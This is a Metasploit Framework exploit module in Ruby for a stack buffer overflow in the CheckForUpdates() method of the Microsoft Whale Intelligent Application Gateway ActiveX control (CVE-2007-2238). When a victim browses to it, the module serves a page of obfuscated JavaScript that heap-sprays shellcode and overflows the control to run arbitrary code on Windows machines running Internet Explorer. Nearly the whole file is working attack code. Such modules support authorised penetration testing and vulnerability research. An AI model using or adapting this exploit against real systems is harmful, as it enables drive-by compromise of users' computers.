##
# $Id: mswhale_checkforupdates.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Whale Intelligent Application Gateway ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Microsoft Whale Intelligent Application
				Gateway Whale Client. When sending an overly long string to CheckForUpdates()
				method of WhlMgr.dll (3.1.502.64) an attacker may be able to execute
				arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2007-2238' ],
					[ 'OSVDB', '53933'],
					[ 'URL', 'http://technet.microsoft.com/en-us/library/dd282918.aspx' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]
				],
			'DisclosureDate' => 'Apr 15 2009',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# fluff..
		fluff = rand_text_english(rand(20) + 1)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Set the return.
		ret = Rex::Text.uri_encode(Metasm::Shellcode.assemble(Metasm::Ia32.new, "or cl,[edx]").encode_string * 2)

		js = %Q|
			try {
				var evil_string = "";
				var index;
				var vulnerable = new ActiveXObject('ComponentManager.Installer.1');
				var my_unescape = unescape;
				var shellcode = '#{shellcode}';
				#{js_heap_spray}
				sprayHeap(my_unescape(shellcode), 0x0a0a0a0a, 0x40000);
				for (index = 0; index < 15000; index++) {
					evil_string = evil_string + my_unescape('#{ret}');
				}
				vulnerable.CheckForUpdates(evil_string,'#{fluff}');
			} catch( e ) { window.location = 'about:blank' ; }
		|

		opts = {
			'Strings' => true,
			'Symbols' => {
				'Variables' => [
					'vulnerable',
					'shellcode',
					'my_unescape',
					'index',
					'evil_string',
				]
			}
		}
		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
		js.update_opts(js_heap_spray.opts)
		js.obfuscate()
		content = %Q|<html>
<body>
<script><!--
#{js}
//</script>
</body>
</html>
|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
